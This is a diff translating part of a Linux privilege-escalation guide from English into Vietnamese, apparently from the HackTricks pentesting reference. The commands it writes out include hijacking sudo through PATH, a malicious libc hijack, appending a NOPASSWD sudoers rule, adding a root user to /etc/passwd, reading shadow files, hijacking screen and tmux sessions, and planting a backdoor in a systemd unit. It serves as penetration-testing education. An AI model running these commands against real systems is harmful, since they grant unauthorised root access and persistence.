-Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
+Lưu ý rằng nếu người dùng dùng một shell khác (không phải bash), bạn sẽ cần sửa đổi các tệp khác để thêm đường dẫn mới. Ví dụ, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) sửa đổi `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Bạn có thể tìm một ví dụ khác trong [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
-Or running something like:
+Hoặc chạy thứ gì đó như:
 
 ```bash
 cat >/tmp/sudo <<EOF
@@ -1797,16 +1797,16 @@ echo $PATH
 sudo ls
 ```
 
-## Shared Library
+## Thư viện dùng chung
 
 ### ld.so
 
-The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`
+Tệp `/etc/ld.so.conf` cho biết **các tệp cấu hình được tải nằm ở đâu**. Thông thường, tệp này chứa đường dẫn sau: `include /etc/ld.so.conf.d/*.conf`
 
-That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.
+Điều đó có nghĩa là các tệp cấu hình trong `/etc/ld.so.conf.d/*.conf` sẽ được đọc. Các tệp cấu hình này **trỏ đến những thư mục khác** để **tìm kiếm** **thư viện**. Ví dụ: nội dung của `/etc/ld.so.conf.d/libc.conf` là `/usr/local/lib`. **Điều này có nghĩa là hệ thống sẽ tìm kiếm thư viện trong `/usr/local/lib`**.
 
-If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
-Take a look at **how to exploit this misconfiguration** in the following page:
+Nếu vì lý do nào đó **người dùng có quyền ghi** vào bất kỳ đường dẫn nào sau đây: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bất kỳ tệp nào bên trong `/etc/ld.so.conf.d/` hoặc bất kỳ thư mục nào được chỉ định trong tệp cấu hình bên trong `/etc/ld.so.conf.d/*.conf`, thì người đó có thể leo thang đặc quyền.\
+Hãy xem **cách khai thác cấu hình sai này** trên trang sau:
 
 
 {{#ref}}
@@ -1826,7 +1826,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
  /lib/ld-linux.so.2 (0x005bb000)
 ```
 
-By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
+Bằng cách sao chép lib vào `/var/tmp/flag15/`, chương trình sẽ sử dụng lib tại vị trí này như được chỉ định trong biến `RPATH`.
 
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
@@ -1837,7 +1837,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
  /lib/ld-linux.so.2 (0x00737000)
 ```
 
-Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+Sau đó tạo một thư viện độc hại trong `/var/tmp` bằng lệnh `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 
 ```c
 #include<stdlib.h>
@@ -1854,24 +1854,24 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 
 ## Capabilities
 
-Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
-Read the following page to **learn more about capabilities and how to abuse them**:
+Linux capabilities cung cấp **một tập hợp con các quyền root hiện có cho một tiến trình**. Điều này thực chất chia **các quyền root thành những đơn vị nhỏ hơn, riêng biệt**. Sau đó, từng đơn vị có thể được cấp độc lập cho các tiến trình. Nhờ vậy, toàn bộ tập hợp quyền được thu hẹp, giảm nguy cơ bị khai thác.\
+Đọc trang sau để **tìm hiểu thêm về capabilities và cách lạm dụng chúng**:
 
 
 {{#ref}}
 ../../interesting-files-permissions/linux-capabilities.md
 {{#endref}}
 
-## Directory permissions
+## Quyền thư mục
 
-In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
-The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.
+Trong một thư mục, **bit "execute"** có nghĩa là người dùng chịu ảnh hưởng có thể "**cd**" vào thư mục đó.\
+Bit **"read"** có nghĩa là người dùng có thể **liệt kê** các **tệp**, còn bit **"write"** có nghĩa là người dùng có thể **xóa** và **tạo** các **tệp** mới.
 
 ## ACLs
 
-Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>
+Access Control Lists (ACLs) là lớp quyền tùy ý thứ cấp, có thể **ghi đè các quyền ugo/rwx truyền thống**. Các quyền này tăng cường khả năng kiểm soát quyền truy cập vào tệp hoặc thư mục bằng cách cho phép hoặc từ chối quyền đối với những người dùng cụ thể không phải chủ sở hữu hoặc thành viên nhóm. Mức độ **chi tiết này đảm bảo việc quản lý quyền truy cập chính xác hơn**. Bạn có thể xem thêm chi tiết [**tại đây**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>
 
-**Give** user "kali" read and write permissions over a file:
+**Cấp** cho người dùng "kali" quyền đọc và ghi đối với một tệp:
 
 ```bash
 setfacl -m u:kali:rw file.txt
@@ -1880,22 +1880,22 @@ setfacl -m u:kali:rw file.txt
 setfacl -b file.txt #Remove the ACL of the file
 ```
 
-**Get** files with specific ACLs from the system:
+**Lấy** các tệp có ACL cụ thể từ hệ thống:
 
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 
-### Hidden ACL backdoor on sudoers drop-ins
+### Backdoor ACL ẩn trong các tệp drop-in của sudoers
 
-A common misconfiguration is a root-owned file in `/etc/sudoers.d/` with mode `440` that still grants write access to a low-priv user via ACL.
+Một cấu hình sai phổ biến là tệp thuộc sở hữu của root trong `/etc/sudoers.d/` có quyền `440` nhưng vẫn cấp quyền ghi cho người dùng có đặc quyền thấp thông qua ACL.
 
 ```bash
 ls -l /etc/sudoers.d/*
 getfacl /etc/sudoers.d/<file>
 ```
 
-If you see something like `user:alice:rw-`, the user can append a sudo rule despite restrictive mode bits:
+Nếu bạn thấy dạng như `user:alice:rw-`, người dùng đó vẫn có thể thêm quy tắc sudo dù các bit quyền hạn chế:
 
 ```bash
 echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
@@ -1903,15 +1903,15 @@ visudo -cf /etc/sudoers.d/<file>
 sudo -l
 ```
 
-This is a high-impact ACL persistence/privesc path because it is easy to miss in `ls -l`-only reviews.
+Đây là đường dẫn persistence/privesc ACL có tác động cao vì rất dễ bị bỏ sót khi chỉ kiểm tra bằng `ls -l`.
 
-## Open shell sessions
+## Các phiên shell đang mở
 
-Cross-user GNU Screen access depends on the **running session's configuration and ACL**, not its version alone. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) that it must be built with multiuser support; `multiuser on` and an `acladd` or suitable `aclchg` grant allow another user to attach. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) for the cross-user session lookup. A visible root-owned socket or a SUID `screen` binary alone does not establish an attachable root shell. Confirm the live session is multiuser, the current user has effective input/command permission, and the shell in that session runs as the privileged owner before treating it as escalation.
+Quyền truy cập GNU Screen giữa các người dùng phụ thuộc vào **cấu hình và ACL của phiên đang chạy**, không chỉ phiên bản. [GNU Screen ghi rõ](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) rằng chương trình phải được build với hỗ trợ multiuser; `multiuser on` cùng với quyền `acladd` hoặc `aclchg` phù hợp cho phép người dùng khác attach. [Tài liệu cũng yêu cầu setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) để tra cứu phiên giữa các người dùng. Chỉ thấy một socket thuộc sở hữu của root hoặc một binary `screen` SUID không đủ để khẳng định có thể attach vào shell root. Hãy xác nhận phiên đang hoạt động bật multiuser, người dùng hiện tại có quyền nhập lệnh/thực thi hiệu lực, và shell trong phiên chạy với quyền của chủ sở hữu có đặc quyền trước khi xem đây là một con đường leo thang đặc quyền.
 
 ### screen sessions hijacking
 
-**List screen sessions**
+**Liệt kê các phiên screen**
 
 ```bash
 screen -ls
@@ -1921,9 +1921,9 @@ screen -ls <username>/ # Show another user' screen sessions
 ls /run/screen/ /var/run/screen/ 2>/dev/null
 ```
 
-![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
+![chiếm quyền session screen - Vị trí socket (một số hệ thống hiển thị một vị trí dưới dạng symlink của vị trí kia): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
 
-**Attach to a session**
+**Kết nối vào một session**
 
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
@@ -1931,11 +1931,11 @@ screen -dr 3350.foo #In the example of the image
 screen -x [user]/[session id]
 ```
 
-## tmux sessions hijacking
+## Hijacking phiên tmux
 
-This was a problem with **old tmux versions**. I wasn't able to hijack a tmux (v2.1) session created by root as a non-privileged user.
+Đây từng là vấn đề ở **các phiên bản tmux cũ**. Tôi không thể hijack một phiên tmux (v2.1) do root tạo khi sử dụng tài khoản không có đặc quyền.
 
-**List tmux sessions**
+**Liệt kê các phiên tmux**
 
 ```bash
 tmux ls
@@ -1943,9 +1943,9 @@ ps aux | grep tmux #Search for tmux consoles not using default folder for socket
 tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
 ```
 
-![Socket locations (some systems expose one as symlink of the other) - tmux sessions hijacking: tmux -S /tmp/dev sess ls List using that socket, you can start a tmux session in that socket...](<../../images/image (837).png>)
+![Vị trí socket (một số hệ thống cung cấp một socket dưới dạng symlink đến socket còn lại) - chiếm quyền các phiên tmux: tmux -S /tmp/dev sess ls Liệt kê bằng socket đó; bạn có thể khởi chạy một phiên tmux trên socket đó...](<../../images/image (837).png>)
 
-**Attach to a session**
+**Kết nối vào một phiên**
 
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
@@ -1957,91 +1957,91 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
 
-Check **Valentine box from HTB** for an example.
+Xem **Valentine box from HTB** để tham khảo ví dụ.
 
 ## SSH
 
 ### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
-Keys generated with affected Debian or derivative OpenSSL builds during the historical vulnerable period may have predictable randomness; the host's current distribution or patched OpenSSL version does not establish how an older key was generated. Check the **specific key** against a suitable historical blacklist and its provenance. Debian's [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) describes checking public keys and `authorized_keys`, and [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) records the OpenSSL fix. An entry in a privileged account's `authorized_keys` is an escalation lead only if its matching private key is recoverable and the effective SSH policy still accepts that key for that account; a weak **host** key is not itself a login credential. Replace compromised keys and remove their old authorizations.
+Các key được tạo bằng bản dựng OpenSSL bị ảnh hưởng trên Debian hoặc các bản phân phối phái sinh trong giai đoạn từng có lỗ hổng có thể dùng dữ liệu ngẫu nhiên dễ đoán; bản phân phối hiện tại của máy chủ hoặc phiên bản OpenSSL đã vá không cho biết key cũ được tạo như thế nào. Hãy kiểm tra **key cụ thể** bằng blacklist lịch sử phù hợp và xác minh nguồn gốc của key. Tài liệu [`ssh-vulnkey` của Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) hướng dẫn kiểm tra public key và `authorized_keys`; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ghi nhận bản sửa OpenSSL. Một mục trong `authorized_keys` của tài khoản đặc quyền chỉ là manh mối leo thang đặc quyền nếu có thể lấy lại private key tương ứng và chính sách SSH có hiệu lực vẫn chấp nhận key đó cho tài khoản ấy; **host key** yếu tự nó không phải thông tin đăng nhập. Hãy thay các key bị xâm phạm và xóa các mục cấp quyền cũ.
 
-### SSH Interesting configuration values
+### Các giá trị cấu hình SSH đáng chú ý
 
-- **PasswordAuthentication:** Specifies whether password authentication is allowed. The upstream OpenSSH default is `yes`; distribution configuration can override it.
-- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
-- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
+- **PasswordAuthentication:** Chỉ định có cho phép xác thực bằng password hay không. Giá trị mặc định của OpenSSH upstream là `yes`; cấu hình của bản phân phối có thể ghi đè giá trị này.
+- **PubkeyAuthentication:** Chỉ định có cho phép xác thực bằng public key hay không. Giá trị mặc định là `yes`.
+- **PermitEmptyPasswords**: Khi cho phép xác thực bằng password, tùy chọn này chỉ định máy chủ có cho phép đăng nhập vào các tài khoản có chuỗi password rỗng hay không. Giá trị mặc định là `no`.
 
-### Login control files
+### Các tệp kiểm soát đăng nhập
 
-These files influence who can log in and how:
+Các tệp này ảnh hưởng đến việc ai có thể đăng nhập và cách đăng nhập:
 
-- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
-- **`/etc/securetty`**: restricts where root can log in (TTY allowlist).
-- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).
+- **`/etc/nologin`**: nếu tồn tại, chặn đăng nhập của người dùng không phải root và hiển thị thông báo trong tệp.
+- **`/etc/securetty`**: giới hạn nơi root có thể đăng nhập (danh sách TTY được phép).
+- **`/etc/motd`**: banner sau khi đăng nhập (có thể làm lộ thông tin môi trường hoặc bảo trì).
 
 ### PermitRootLogin
 
-Specifies whether root can log in using ssh. The upstream OpenSSH default is `prohibit-password`; distribution configuration can override it. Possible values:
+Chỉ định root có thể đăng nhập bằng ssh hay không. Giá trị mặc định của OpenSSH upstream là `prohibit-password`; cấu hình của bản phân phối có thể ghi đè giá trị này. Các giá trị có thể có:
 
-- `yes`: root can login using password and private key
-- `without-password` or `prohibit-password`: root can only login with a private key
-- `forced-commands-only`: Root can login only using private key and if the commands options are specified
-- `no` : no
+- `yes`: root có thể đăng nhập bằng password và private key
+- `without-password` hoặc `prohibit-password`: root chỉ có thể đăng nhập bằng private key
+- `forced-commands-only`: Root chỉ có thể đăng nhập bằng private key và khi các tùy chọn commands được chỉ định
+- `no` : không cho phép
 
-### Trusted SSH user certificate authorities
+### Các certificate authority SSH được tin cậy cho người dùng
 
-`TrustedUserCAKeys` names public keys that sshd trusts to sign **user** certificates. If the corresponding private CA key is readable by a lower-privileged user, review who may obtain a certificate and which account principals it could authenticate as. `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` can restrict accepted names; when neither is configured, the certificate must contain the target account name. `PermitRootLogin prohibit-password` blocks root password authentication but can still permit certificate authentication. An exposed key path alone does not prove access: confirm the public/private key pair, effective `Match` rules, account policy, key passphrase, revocation, and accepted signature algorithms. Do not include private-key bytes in enumeration output. See the [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).
+`TrustedUserCAKeys` chỉ định các public key mà sshd tin cậy để ký certificate **người dùng**. Nếu private CA key tương ứng có thể được người dùng có ít đặc quyền hơn đọc, hãy xem xét ai có thể nhận certificate và certificate đó có thể xác thực với principal của tài khoản nào. `AuthorizedPrincipalsFile` hoặc `AuthorizedPrincipalsCommand` có thể giới hạn các tên được chấp nhận; nếu không cấu hình cả hai, certificate phải chứa tên tài khoản đích. `PermitRootLogin prohibit-password` chặn xác thực root bằng password nhưng vẫn có thể cho phép xác thực bằng certificate. Chỉ riêng đường dẫn key bị lộ không chứng minh có thể truy cập: hãy xác minh cặp public/private key, các quy tắc `Match` có hiệu lực, chính sách tài khoản, passphrase của key, trạng thái thu hồi và các thuật toán chữ ký được chấp nhận. Không đưa nội dung private key vào kết quả liệt kê. Xem [tài liệu cấu hình máy chủ OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).
 
-A private CA key can also be usable **without being readable** to the current user if a privilege-delegation rule lets that user invoke an unrestricted [certificate signer such as `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) under the key owner's identity. Correlate the exact allowed command and arguments with the signer account's access to the key, the public CA trusted by the effective sshd configuration, the principal accepted for the target account, certificate validity, and that account's login policy. A delegated signer command or a trusted CA file alone does not prove access to another account; do not sign a test certificate during passive enumeration.
+Private CA key cũng có thể được sử dụng **mà không cần người dùng hiện tại đọc được key** nếu có quy tắc ủy quyền đặc quyền cho phép người dùng đó gọi một [certificate signer không bị giới hạn như `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) dưới danh tính của chủ sở hữu key. Đối chiếu chính xác lệnh và đối số được phép với quyền truy cập key của tài khoản ký, public CA được cấu hình sshd có hiệu lực tin cậy, principal được chấp nhận cho tài khoản đích, thời hạn hiệu lực của certificate và chính sách đăng nhập của tài khoản đó. Chỉ riêng lệnh signer được ủy quyền hoặc tệp CA được tin cậy không chứng minh có thể truy cập tài khoản khác; không ký certificate thử nghiệm trong quá trình liệt kê thụ động.
 
 ### AuthorizedKeysFile
 
-Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
+Chỉ định các tệp chứa public key có thể dùng để xác thực người dùng. Tệp có thể chứa các token như `%h`, được thay bằng thư mục home. **Bạn có thể chỉ định đường dẫn tuyệt đối** (bắt đầu bằng `/`) hoặc **đường dẫn tương đối tính từ thư mục home của người dùng**. Ví dụ:
 
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
 
-That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
+Cấu hình đó cho biết rằng nếu bạn thử đăng nhập bằng khóa **private** của người dùng "**testusername**", ssh sẽ so sánh khóa public của bạn với các khóa nằm trong `/home/testusername/.ssh/authorized_keys` và `/home/testusername/access`
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.
+SSH agent forwarding cho phép bạn **dùng các khóa SSH cục bộ thay vì để các khóa** (không có passphrase!) nằm trên server. Nhờ đó, bạn có thể **dùng ssh để nhảy** **đến một host**, rồi từ đó **nhảy đến một** host **khác bằng** **khóa** nằm trên **host ban đầu** của bạn.
 
-You need to set this option in `$HOME/.ssh.config` like this:
+Bạn cần đặt tùy chọn này trong `$HOME/.ssh.config` như sau:
 
 ```
 Host example.com
   ForwardAgent yes
 ```
 
-Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).
+Lưu ý rằng nếu `Host` là `*`, mỗi khi người dùng chuyển sang một máy khác, máy đó sẽ có thể truy cập các key (đây là vấn đề bảo mật).
 
-The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
-The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).
+Tệp `/etc/ssh_config` có thể **ghi đè** các **tùy chọn** này và cho phép hoặc từ chối cấu hình này.\
+Tệp `/etc/sshd_config` có thể **cho phép** hoặc **từ chối** SSH agent forwarding bằng từ khóa `AllowAgentForwarding` (mặc định là cho phép).
 
-If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:
+Nếu phát hiện Forward Agent được cấu hình trong một môi trường, hãy đọc trang sau vì **bạn có thể lợi dụng tính năng này để leo thang đặc quyền**:
 
 
 {{#ref}}
 ../../user-information/ssh-forward-agent-exploitation.md
 {{#endref}}
 
-## Interesting Files
+## Các tệp đáng chú ý
 
-### Profiles files
+### Các tệp profile
 
-The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
+Tệp `/etc/profile` và các tệp trong `/etc/profile.d/` là **các script được thực thi khi người dùng mở một shell mới**. Vì vậy, nếu có thể **ghi hoặc sửa đổi bất kỳ tệp nào trong số đó, bạn có thể leo thang đặc quyền**.
 
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
 
-If any weird profile script is found you should check it for **sensitive details**.
+Nếu tìm thấy bất kỳ script profile lạ nào, bạn nên kiểm tra xem chúng có chứa **thông tin nhạy cảm** hay không.
 
-### Passwd/Shadow Files
+### Tệp Passwd/Shadow
 
-Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of them** and **check if you can read** them to see **if there are hashes** inside the files:
+Tùy thuộc vào hệ điều hành, các tệp `/etc/passwd` và `/etc/shadow` có thể được đặt tên khác hoặc có thể có bản sao lưu. Vì vậy, bạn nên **tìm tất cả các tệp này** và **kiểm tra xem bạn có thể đọc chúng hay không** để xem **bên trong có chứa hash không**:
 
 ```bash
 #Passwd equivalent files
@@ -2050,15 +2050,15 @@ cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
 
-In some occasions you can find **password hashes** inside the `/etc/passwd` (or equivalent) file
+Trong một số trường hợp, bạn có thể tìm thấy **hash mật khẩu** bên trong tệp `/etc/passwd` (hoặc tệp tương đương)
 
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
 
-### Writable /etc/passwd
+### /etc/passwd có thể ghi
 
-First, generate a password with one of the following commands.
+Trước tiên, tạo mật khẩu bằng một trong các lệnh sau.
 
 ```
 openssl passwd -1 -salt hacker hacker
@@ -2066,34 +2066,34 @@ mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
 
-Then add the user `hacker` and add the generated password.
+Sau đó, thêm người dùng `hacker` và đặt mật khẩu đã tạo.
 
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
 
-E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+Ví dụ: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-You can now use the `su` command with `hacker:hacker`
+Giờ bạn có thể dùng lệnh `su` với `hacker:hacker`
 
-Alternatively, you can use the following lines to add a dummy user without a password.\
-WARNING: you might degrade the current security of the machine.
+Ngoài ra, bạn có thể dùng các dòng sau để thêm một người dùng giả không có mật khẩu.\
+CẢNH BÁO: việc này có thể làm giảm mức độ bảo mật hiện tại của máy.
 
 ```
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
 
-NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
+LƯU Ý: Trên các nền tảng BSD, `/etc/passwd` nằm ở `/etc/pwd.db` và `/etc/master.passwd`; `/etc/shadow` cũng được đổi tên thành `/etc/spwd.db`.
 
-You should check if you can **write in some sensitive files**. For example, can you write to some **service configuration file**?
+Bạn nên kiểm tra xem mình có thể **ghi vào một số tệp nhạy cảm** hay không. Ví dụ: bạn có thể ghi vào một **tệp cấu hình dịch vụ** nào không?
 
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
 
-For example, if the machine is running a **tomcat** server and you can **modify the Tomcat service configuration file inside /etc/systemd/,** then you can modify the lines:
+Ví dụ: nếu máy đang chạy máy chủ **tomcat** và bạn có thể **chỉnh sửa tệp cấu hình dịch vụ Tomcat bên trong /etc/systemd/,** thì bạn có thể chỉnh sửa các dòng:
 
 ```
 ExecStart=/path/to/backdoor
@@ -2101,17 +2101,17 @@ User=root
 Group=root
 ```
 
-Your backdoor will be executed the next time that tomcat is started.
+Backdoor của bạn sẽ được thực thi vào lần tiếp theo tomcat được khởi động.
 
-### Check Folders
+### Kiểm tra thư mục
 
-The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probably you won't be able to read the last one but try)
+Các thư mục sau có thể chứa bản sao lưu hoặc thông tin đáng chú ý: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Có lẽ bạn sẽ không thể đọc thư mục cuối cùng, nhưng hãy thử)
 
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
 
-### Weird Location/Owned files
+### Vị trí bất thường/Tệp thuộc sở hữu
 
 ```bash
 #root owned files in /home folders
@@ -2130,19 +2130,19 @@ for g in `groups`;
 done
 ```
 
-### Modified files in last mins
+### Các tệp đã chỉnh sửa trong vài phút gần đây
 
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
 
-### Sqlite DB files
+### Tệp DB SQLite
 
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
 
-For readable application databases, inspect table and column names for usernames and password hashes. Finding a hash, recovering its password, and proving reuse for a local account are separate steps; a generic 32-character hexadecimal string is not enough to infer MD5 or account access.
+Với các database ứng dụng có thể đọc được, hãy kiểm tra tên bảng và cột để tìm username và password hash. Việc tìm thấy một hash, khôi phục mật khẩu từ hash đó và chứng minh mật khẩu được dùng lại cho tài khoản cục bộ là các bước riêng biệt; chỉ riêng một chuỗi hexadecimal gồm 32 ký tự không đủ để kết luận đó là MD5 hoặc có quyền truy cập tài khoản.
 
 ### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 
@@ -2150,22 +2150,22 @@ For readable application databases, inspect table and column names for usernames
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
 
-If a readable shell history contains a `sudo` command followed by a short, password-like line, inspect the surrounding lines manually. A password entered into the normal `sudo` prompt is not saved in shell history; a following line is only a possible accidental shell input, not proof of a valid password. The `.sudo_as_admin_successful` marker records prior use, not current authorization.
+Nếu lịch sử shell đọc được chứa lệnh `sudo` theo sau là một dòng ngắn trông giống mật khẩu, hãy tự kiểm tra các dòng xung quanh. Mật khẩu được nhập vào lời nhắc `sudo` thông thường không được lưu trong lịch sử shell; dòng tiếp theo chỉ có thể là nội dung vô tình được nhập vào shell, không phải bằng chứng cho thấy đó là mật khẩu hợp lệ. Dấu đánh dấu `.sudo_as_admin_successful` ghi nhận lần sử dụng trước đó, chứ không cho biết quyền hiện tại.
 
-### Hidden files
+### Tệp ẩn
 
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
 
-### **Script/Binaries in PATH**
+### **Script/Binaries trong PATH**
 
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
 
-### **Web files**
+### **Các tệp web**
 
 ```bash
 ls -alhR /var/www/ 2>/dev/null
@@ -2174,44 +2174,44 @@ ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
 
-### **Backups**
+### **Bản sao lưu**
 
-Inspect readable files inside backup directories as well as files whose **names** contain `backup`: an archive with an opaque name or an encrypted extension can still expose old application data. An encrypted archive is only an exposure candidate. Password recovery, inspection of its contents, recovery of an application hash, and reuse of that password for a Unix account are separate steps to verify; a hash in an archive does not establish a local login.
